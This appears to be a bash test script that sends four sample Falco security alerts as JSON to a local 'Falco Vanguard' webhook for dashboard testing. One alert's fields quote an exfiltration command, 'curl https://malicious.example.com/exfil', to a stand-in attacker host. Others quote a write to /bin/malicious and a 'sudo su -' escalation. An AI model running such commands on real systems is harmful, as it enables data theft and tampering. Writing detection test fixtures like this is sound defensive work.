#!/bin/bash

# =================================================================
# Falco Vanguard - Test Alert Sender
# =================================================================
# Sends sample security alerts to test the webhook

WEBHOOK_URL="http://localhost:8080/falco-webhook"

echo "🚨 Sending test security alerts to Falco Vanguard"
echo "========================================================"

# Test Alert 1: Container Shell Access
echo "1️⃣ Sending: Container Shell Access Alert..."
curl -X POST "$WEBHOOK_URL" \
  -H "Content-Type: application/json" \
  -d '{
    "uuid": "test-001",
    "time": "'$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)'",
    "rule": "Terminal shell in container",
    "priority": "warning",
    "output": "A shell was used as the entrypoint/exec point into a container (user=root container=web-app)",
    "output_fields": {
      "container.id": "abc123def456",
      "container.name": "web-app-container",
      "proc.cmdline": "/bin/bash",
      "user.name": "root",
      "proc.name": "bash"
    }
  }' && echo ""

sleep 2

# Test Alert 2: Suspicious File Write
echo "2️⃣ Sending: Suspicious File Write Alert..."
curl -X POST "$WEBHOOK_URL" \
  -H "Content-Type: application/json" \
  -d '{
    "uuid": "test-002",
    "time": "'$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)'",
    "rule": "Write below binary dir",
    "priority": "critical",
    "output": "File below a known binary directory opened for writing (user=attacker file=/bin/malicious)",
    "output_fields": {
      "container.id": "xyz789abc123",
      "container.name": "database-container",
      "proc.cmdline": "touch /bin/malicious",
      "fd.name": "/bin/malicious",
      "user.name": "attacker",
      "proc.name": "touch"
    }
  }' && echo ""

sleep 2

# Test Alert 3: Network Activity
echo "3️⃣ Sending: Suspicious Network Activity Alert..."
curl -X POST "$WEBHOOK_URL" \
  -H "Content-Type: application/json" \
  -d '{
    "uuid": "test-003",
    "time": "'$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)'",
    "rule": "Outbound connection to C2 server",
    "priority": "error",
    "output": "Suspicious outbound network connection detected (destination=malicious.example.com:443)",
    "output_fields": {
      "container.id": "net123conn456",
      "container.name": "api-server",
      "fd.name": "malicious.example.com:443",
      "proc.cmdline": "curl https://malicious.example.com/exfil",
      "user.name": "www-data",
      "proc.name": "curl"
    }
  }' && echo ""

sleep 2

# Test Alert 4: Privilege Escalation
echo "4️⃣ Sending: Privilege Escalation Alert..."
curl -X POST "$WEBHOOK_URL" \
  -H "Content-Type: application/json" \
  -d '{
    "uuid": "test-004",
    "time": "'$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)'",
    "rule": "Sudo potential privilege escalation",
    "priority": "critical",
    "output": "User ran sudo command to escalate privileges (user=ubuntu command=sudo su -)",
    "output_fields": {
      "container.id": "priv567esc890",
      "container.name": "worker-node",
      "proc.cmdline": "sudo su -",
      "user.name": "ubuntu",
      "proc.name": "sudo"
    }
  }' && echo ""

echo ""
echo "✅ Test alerts sent successfully!"
echo ""
echo "📊 View results at: http://localhost:8080/dashboard"
echo "💬 Test AI chat at: http://localhost:8080/dashboard (chat panel)"
echo "📋 Check logs: docker-compose logs -f falco-ai-alerts"
echo "" 